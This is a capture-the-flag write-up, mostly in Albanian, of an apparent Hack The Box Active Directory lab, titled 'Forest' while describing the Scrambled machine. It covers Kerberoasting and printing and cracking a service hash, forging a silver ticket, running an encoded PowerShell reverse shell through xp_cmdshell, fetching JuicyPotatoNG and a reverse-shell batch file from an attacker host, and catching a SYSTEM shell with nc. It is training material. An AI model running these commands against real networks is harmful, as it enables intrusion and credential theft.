---
title: "HTB — Forest Writeup"
date: 2025-06-25
categories: [HackTheBox, Easy]
tags: [AS-REP Roasting, BloodHound, DCSync, Windows, AD]
---

### **About**

Scrambled is a medium Windows Active Directory machine. Enumerating the website hosted on the remote machine a potential attacker is able to deduce the credentials for the user `ksimpson`. On the website, it is also stated that NTLM authentication is disabled meaning that Kerberos authentication is to be used. Accessing the `Public` share with the credentials of `ksimpson`, a PDF file states that an attacker retrieved the credentials of an SQL database. This is a hint that there is an SQL service running on the remote machine. Enumerating the normal user accounts, it is found that the account `SqlSvc` has a `Service Principal Name` (SPN) associated with it. An attacker can use this information to perform an attack that is knows as `kerberoasting` and get the hash of `SqlSvc`. After cracking the hash and acquiring the credentials for the `SqlSvc` account an attacker can perform a `silver ticket` attack to forge a ticket and impersonate the user `Administrator` on the remote MSSQL service. Enumeration of the database reveals the credentials for user `MiscSvc`, which can be used to execute code on the remote machine using PowerShell remoting. System enumeration as the new user reveals a `.NET` application, which is listening on port `4411`. Reverse engineering the application reveals that it is using the insecure `Binary Formatter` class to transmit data, allowing the attacker to upload their own payload and get code execution as `nt authority\system`.

---

## 1. Initial Enumeration

```bash
**nmap -sC -sV -T4 -p- 10.129.17.203                          
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-17 17:54 -0400
Nmap scan report for 10.129.17.203
Host is up (0.057s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Scramble Corp Intranet
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-17 21:57:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2026-06-17T22:00:23+00:00; 0s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2026-06-17T22:00:23+00:00; 0s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-06-17T21:52:05
|_Not valid after:  2056-06-17T21:52:05
|_ssl-date: 2026-06-17T22:00:23+00:00; 0s from scanner time.
| ms-sql-info: 
|   10.129.17.203:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2026-06-17T22:00:23+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-06-17T22:00:23+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
4411/tcp  open  found?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49720/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V=7.99%I=7%D=6/17%Time=6A33183B%P=x86_64-pc-linux-gnu%r(NU
SF:LL,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCRAMBLEC
SF:ORP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.
SF:3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP_ORDER
SF:S_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCRAMBLEC
SF:ORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1D,"SCR
SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAMBLECOR
SF:P_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_ORDERS_
SF:V1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNO
SF:WN_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n
SF:")%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TLS
SF:SessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,"SCRAM
SF:BLECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDERS_V1\
SF:.0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(FourO
SF:hFourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND
SF:;\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_
SF:COMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%
SF:r(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOptions,35,"
SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(LANDesk
SF:-RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"SCRAMB
SF:LECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r
SF:\n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI,1D,"S
SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_ORDERS
SF:_V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r
SF:(ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAMBLECOR
SF:P_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n");
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-06-17T21:59:47
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required**

```

Domain : `scrm.local` & **`DC1.scrm.local`**

Prioritizojm enumerimin e portave te zbuluara ne kete menyre :

- 445 microsoft-ds / smb
- 53 DNS
- 80 http
- 5985 http
- 88 kerberos
- 389 ldap
- 464 kpasswd5
- 636 ssl/ldap
- 1433 MSSQL
- 4411 found? → Nuk e dim cfare eshte kjo port
- 9389 mc-nmf

Kemi nje port te personalizuar `4411` ?

---

# SMB Not Working

Me serbimin SMB nuk mund te lidhemi !!!

```bash
 smbclient -L //10.129.19.42 -U ''
session setup failed: NT_STATUS_NOT_SUPPORTED
```

Kuptojm qe smb share deshtoi ngaq protokolli NTLM eshte bere `disable` .

# Web

1. Ne web zbulojm nje mesazh qe sherbimi NTLM eshte disable.

!2026-06-20 10_46_20-kali-linux-2026.1-vmware-amd64 - VMware Workstation.png

## Cfare ben NTLM ?

### NTLM (New Technology LAN Manager)

Kur identifikohesh në një sistem që përdor NTLM:

1. Fut username dhe password.
2. Serveri nuk kërkon password-in direkt.
3. Serveri dërgon një numër të rastësishëm (challenge).
4. Klienti përdor hash-in e password-it për të krijuar një përgjigje (response).
5. Serveri verifikon përgjigjen dhe lejon hyrjen.

### Avantazhet

- Punon edhe pa Active Directory.
- Është i thjeshtë dhe kompatibël me sisteme të vjetra.

### Disavantazhet

- Më pak i sigurt.
- I prekshëm ndaj sulmeve si:
    - Pass-the-Hash
    - NTLM Relay
    - Credential Theft

Pasi NTLM eshte disable ather funksionon betem Kerberos

## Kerberos

Kerberos është protokolli modern i autentikimit në Active Directory.

Kur identifikohesh:

1. Klienti kontakton **Key Distribution Center (KDC)** në Domain Controller.
2. KDC verifikon përdoruesin.
3. KDC lëshon një **Ticket Granting Ticket (TGT)**.
4. Me TGT, klienti kërkon bileta për shërbime specifike (TGS).
5. Klienti përdor këto bileta për të hyrë në serverë pa dërguar password-in përsëri.

### Avantazhet

- Më i sigurt.
- Përdor bileta (tickets) në vend të password-eve.
- Mbështet Single Sign-On (SSO).
- Më rezistent ndaj sulmeve relay.

### Disavantazhet

- Kërkon sinkronizim kohe.
- Varet nga Domain Controller/KDC.

Fillojm enumerimin perseri  

1. Zbulojm dhe nje email  : support@scramblecorp.com 

Kemi nje user `support` dhe nje nr telefoni `0866`

!2026-06-20 11_31_02-kali-linux-2026.1-vmware-amd64 - VMware Workstation.png

1. Zbulojm nje username ne screenshot te faqes `ksimpson`

!2026-06-20 11_15_49-kali-linux-2026.1-vmware-amd64 - VMware Workstation.png

Ne Web bejm `copy imazhin link`  dhe shkarkojmp er te zbuluar metadatat

```bash
wget 'http://10.129.19.42/images/ipconfig.jpg
```

!ipconfig.jpg

Perdorim `exiftool` per te nxjerr medata nga fotoja

```bash
exiftool ipconfig.jpg
```

!2026-06-20 11_28_43-kali-linux-2026.1-vmware-amd64 - VMware Workstation.png

Shikojm qe eshte modifikuar per here te fundit ne : `2021:11:03` 

Autori eshte `VbScrub` , mund te jet nje tjeter user.

---

## Cfare kemi zbuluar deri tani ???

- NTLM eshte disable
- 0866 IT Support Numer
- Users Name
    1. support
    2. ksimpson
    3. VbScrub

Tani cfare mund te bejm ??? 

---

## Password Spay & Pre-Authetication

Perdorim kerbrute per te mbledhur te gjithse username qe ndodhe ne sistem me nje list username qe do e perpdorim per enumrim `jsmith.txt`

```bash
./kerbrute_linux_amd64 userenum -d scrm.local --dc 10.129.19.42 jsmiht.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/20/26 - Ronnie Flathers @ropnop

2026/06/20 06:34:29 >  Using KDC(s):
2026/06/20 06:34:29 >   10.129.19.42:88

2026/06/20 06:34:30 >  [+] VALID USERNAME:       asmith@scrm.local
2026/06/20 06:34:31 >  [+] VALID USERNAME:       jhall@scrm.local
2026/06/20 06:34:41 >  [+] VALID USERNAME:       sjenkins@scrm.local
2026/06/20 06:34:46 >  [+] VALID USERNAME:       ksimpson@scrm.local
2026/06/20 06:34:56 >  [+] VALID USERNAME:       khicks@scrm.local
```

Kemi zbuluar per 5 username.

## Kerbrute

Krijuam nje list te till per te shikur ndonje user mos ka si password emrin e tije

```bash
support:support
ksimpson:ksimpson
VbScrub:VbScrub
asmith:asmith
jhall:jhall
sjenkins:sjenkins
kthicks:kthicks

```

ZBulojm kredenciale `ksimpson`:`ksimpson`

```bash
./kerbrute_linux_amd64 bruteforce --dc dc1.scrm.local -d scrm.local username.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/22/26 - Ronnie Flathers @ropnop

2026/06/22 06:39:41 >  Using KDC(s):
2026/06/22 06:39:41 >   dc1.scrm.local:88

2026/06/22 06:39:41 >  [+] VALID LOGIN:  ksimpson@scrm.local:ksimpson
2026/06/22 06:39:41 >  Done! Tested 7 logins (1 successes) in 0.248 seconds
```

---

## Impacket to get TGT Ticket

Pasi me kredencialet nuk mund te identifikohemi dhe kemi opsion vetem kerberos.

getTGT.py

```bash
python3 getTGT.py scrm.local/ksimpson:ksimpson  
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ksimpson.ccache

export KRB5CCNAME=ksimpson.ccache
```

GetUserSPNs.py

```bash
./GetUserSPNs.py scrm.local/ksimpson -dc-host  dc1.scrm.local -k
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2026-06-22 06:25:22.544850             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2026-06-22 06:25:22.544850             

```

Perdorim `-no-passs -request` per te kerkuar hashin per ta thyer

```bash
./GetUserSPNs.py scrm.local/ksimpson -dc-host  dc1.scrm.local -k -no-pass -request
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2026-06-22 06:25:22.544850             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2026-06-22 06:25:22.544850             

$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$721cf65c2cab60aff172ab92020f677c$f94798e6a817c0c161eed7a335ecc45db23132dfe47ce117171479835b5513d38402ffad501b70eedaafd5948758215ef2e75ce2334ef0e353fdf47b799557486505b01dccb9ab60dee4c8d9e613312c140d5b8208337d178ed868b403e21199e4a45b4924a2939f5200ee26f41ef3bb764fd0921bedaa5d21054ef56dbadbcde972d9981d839eb794b5866952cf1add15cb7744877c549a18c7aca91f4507273ce22af2a85d53a32f12f25a7b80679471b5e42bd889866cb6beb3ab6c3e5ca428de31d209cc68ab898bc8b72c0a5206a28f96bddcb5ec92e53d9dddaa20e74d85d96e21cc4385ad7aea7d8ad68d71c301d7aabe792b59fde0e1b3d98cc1f226fcb2f966da0b070e71f1b88d8c1a6ed3fb832909901c3b8e433afa808455f14b5c47aceb2e98119abca08745754d435fb6371b855da63e108de558015637c183c956aab099758a1b7fea840832b68ff98ddb759cc1fa733f9f9b580a95940149ad4eff1491fdd48fe17315df28b4b9d53bea515dc6b55a0061cb568be18d32b6684138b6b7218965cd6cd6e679fe43908a42b343825836fe52af1fb62cd3689f58ed5e568029026b2775916aac7ba6eee8289e4dc2fe69da43c9934c476116842b3eccf754d7581c3e8581560734960ff6fe3e8392e6698c22e4f53fc49fdaba8cb26569e6778d1975d190273a0059ce99b5af9d5ce83fea01cfc72947cd22fa69d1766876d9064828aea0585c0d88f9f3b665d2ddadf2f2719bbe3a1ecec962d0bdd2e99bfd2534de436ab3434d8e3df6f1bdd047d31c41a0c20744626bd9337d9a8588596c13c379238a3e7b0737a9f08839c388fddbd5dc78f7a00cb4d4ac46427a44da179c1de3c503f9b24a1726b543b6555c7c2792babe05fdcc96ad59b9a04ff443fecdb886c4b4c5219db5c28636570030d6182cf97af7b1a6a700e0d7ebb565b2452d80724f326818045c5b838804f08fe96a0cafab13fccdeda1763bcc1cb7afe4d1ab9d14bdbc3aafe2259eefd2ee393aec57691505a4e9a3766b3e0094b2036e08bc661f16c19a1c6afd35cff30fda5e1ff0a3cf457270359646feafab351932feb94b5328acd73ca1a9aa0478138a38fe7eaf6d940596c7661d6d10f72b7ca2b8f0f519de59cbe64cb591d0d4a6d0d24fe22fc40b3d4fc5d17f987dbd479a6def9dd03852bbb7075f297d3314fbad7cc2ef99ebdad552772dd08b680a0030269cb063d19b18fd650b1e5cd4b12f491067831603ba13af86d6768b087d0454d5010190398b78205f341a78024f41d68e4865a5767e2787375f0493dc3655360bca77218940d74c7718c30ddc28734e5f819d0076f94afe9a48bc5606ee8ca28a5fb6daa46640e6119b349e280c057e004d7308b4e45d40dc16f0cad398dbbb166a0f7abc60c048fe3476d8cf032665cdf629a744cf

```

Thyejm hashin me hashcat dhe zbulojm passwordin

```bash
hashcat -m 13100 -a 0  hash.txt rockyou.txt

# Password
Pegasus60
```

sqlsvc : Pegasus60

Pra te permbledhim se cfare kemi deri tani 

Kredencialet per userat si :

- ksimpson : ksimpson
- sqlsvc: Pegassu60:MSSQLSvc/dc1.scrm.local

---

# Silver Ticket

Nuk po mund te lidhemi me serveri MSSQL poasi morrem kredencialet keshtu po provojm te krijojm nje silver ticket.

Kthejm passwordin Pegasus60 ne NTLM hash nga tool ne web, pastaj e kthejm ne low case pasi eshte sensitive me CyberShef `b999a16500b87d17ec7f2e2a68778f05`

### Using getPac.py to get Domain SID

```bash
python3 getPac.py -targetUser administrator scrm.local/ksimpson:ksimpson 

Domain SID: S-1-5-21-2743207045-1827831105-2542523200
```

---

### Creating Ticket

Kemi gjithcka qe na nevojitet  dhe NTLM hash, pasi morrem passwordin e qart e kthyhem ne ntlm hash.

```bash
ksimpson : ksimpson
sqlsvc: Pegassu60:MSSQLSvc/dc1.scrm.local:b999a16500b87d17ec7f2e2a68778f05
Domain SID: S-1-5-21-2743207045-1827831105-2542523200
```

## Error fix

Kur mundohem te krijoj tiket kemi error qe vjen nga versioni i vjete i ticketer.py

```bash
python3 ticketer.py -spn MSSQLSvc/dc1.scrm.local -user-id 500 Administrator -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local
Traceback (most recent call last):
  File "/home/kali/Desktop/impacket/examples/ticketer.py", line 76, in <module>
    from impacket.krb5.crypto import Key, _enctype_table, get_kerberos_key_for_enctype
ImportError: cannot import name 'get_kerberos_key_for_enctype' from 'impacket.krb5.crypto' (/usr/lib/python3/dist-packages/impacket/krb5/crypto.py)                                                                                             
                              
```

Krijom python env

```bash
python3 -m venv .venv

# Aktivizojm 
source .venv/bin/activate

# upgratojm ipacket file
pip install .
```

Dhe kur e bejm  perseri funskionon.

```bash
 python3 ticketer.py -spn MSSQLSvc/dc1.scrm.local -user-id 500 Administrator -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local
Impacket v0.14.0.dev0+20260619.174856.9a5621d4 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving/Updating ticket in Administrator.ccache
```

```bash
export KRB5CCNAME=Administrator.ccache
```

Shikojm ne ccache qe bileta skadon ne 10 vjet ????

```bash
klist 
Ticket cache: FILE:Administrator.ccache
Default principal: Administrator@SCRM.LOCAL

Valid starting       Expires              Service principal
06/22/2026 06:44:11  06/22/2026 16:44:11  krbtgt/SCRM.LOCAL@SCRM.LOCAL
        for client ksimpson@SCRM.LOCAL, renew until 06/23/2026 06:44:11
06/22/2026 07:26:34  06/19/2036 07:26:34  MSSQLSvc/dc1.scrm.local@SCRM.LOCAL
        renew until 06/19/2036 07:26:34
```

## MySQL

Pastaj perdorim bileten e vendosur ne cache per te marr akses ne databazen sql

```bash
KRB5CCNAME='/home/kali/Desktop/Administrator.ccache' python3 examples/mssqlclient.py -k -no-pass dc1.scrm.local
Impacket v0.14.0.dev0+20260619.174856.9a5621d4 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (SCRM\administrator  dbo@master)> 

```

Gjeja e par kur hym ne nje SQL provojm `xp_cmdshell` po ne kemi akses administratori dhe mund ta ndezim.

!2026-06-23 14_44_28-kali-linux-2026.1-vmware-amd64 - VMware Workstation.png

Mund te lexojm file nga databaza tani. BINGO

### RevShell

Tani qe mund te ekzekutojm komanda nga databaza proovj te krijojm nje reverse shell per tu lidhur me sistemin.

Do perdorim nje rev shell nga Direkotria ne GitHub `nishang >> Shells>> Invoke-PowerShellTcpOneLne.ps1` . Kjo deshtoi

NE Revshells.com krijojm nje reverse shell ne `PowerShell #3 (base64)`  dhe e ekzekutojm ne MSSql

```bash
xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUA....
```

Dhe kemi nje reverse shell me sistemin.

!2026-06-24 11_37_00-kali-linux-2026.1-vmware-amd64 - VMware Workstation.png

---

## Privilege Escalation

Shikojm qe ne sistem kemi `SeImpersonatePrivilege` Enable dhe mudn ta shfrytzojm per PRivEsc

!2026-06-24 11_57_05-kali-linux-2026.1-vmware-amd64 - VMware Workstation.png

Do perdorim JuicePotatoNG  per kete shfrytzim.

!2026-06-24 11_58_19-kali-linux-2026.1-vmware-amd64 - VMware Workstation.png

Transferojm file JuicePotatoNG.exe ne sistem per mes python

```bash
# Hapim web host ne sistmein tone
python3 -m http.server 

# Shkarkojm ne sistem file 
curl IP:8000/JuicePotatoNG.exe -o jp.exe
```

Pasi ta kemi `jp.exe` ne sistemin qe duam te kompromentojm do an duhet dhe nje file `.bat`

- File .bat aktivizohet automatikishte ne windows
- Do vendosim nje reverse shell brenda fle.

Krikojm nje file `priv.bat` dhe vendosim brenda nje reverse shell ne `base64` nga `Revshells.com`

!2026-06-24 12_04_20-kali-linux-2026.1-vmware-amd64 - VMware Workstation.png

Transferojm dhe kyt file ne sistemin qe duam ta kompromentojm

```bash
# Hapim web host ne sistmein tone
python3 -m http.server 

# Shkarkojm ne sistem file 
curl IP:8000/priv.bat -o priv.bat
```

- priv.bat file eshte per reverse shell
- jp.exe kur te shfrtyzojn sistemin

Krijojm nje degjues ne sistemin ton `nc -lvnp 9001` dhe aktivizojm `juicepotato`

```bash
PS C:\programdata> .\jp.exe -t * -p C:\programData\priv.bat

         JuicyPotatoNG
         by decoder_it & splinter_code

[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247 
[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
[+] CreateProcessAsUser OK
[+] Exploit successful! 
```

Ne sistemin tone shikojm qe kemi marr nje shell si system.

```bash
nc -lvnp 9001                                                                   
listening on [any] 9001 ...
connect to [10.10.15.219] from (UNKNOWN) [10.129.20.85] 64810

PS C:\> whoami
nt authority\system

```

Marrim flamruin si user 

```bash
PS C:\Users\miscsvc\Desktop> type user.txt
d9aa46c6aea9e787dd3d97540a86616b
```

Po ashtu dhe flamurin si root

```bash
PS C:\Users\Administrator\Desktop> type root.txt
69d5ffd2c6e101dd47935a56ed4290ba
```

---

# Opsioni 2

Nje opsion tjeter per kompromentim eshte pasi hyjme ne MSSQL te bejm enumerim per kredencialet e userave qe jan ne databaze.

PAstaj mund te lidhemi me at user permes Evil-winrm

PAstaj nga aty te bejm PRivEsc me JuicePotato duke shfrytzuar SeImpersonate
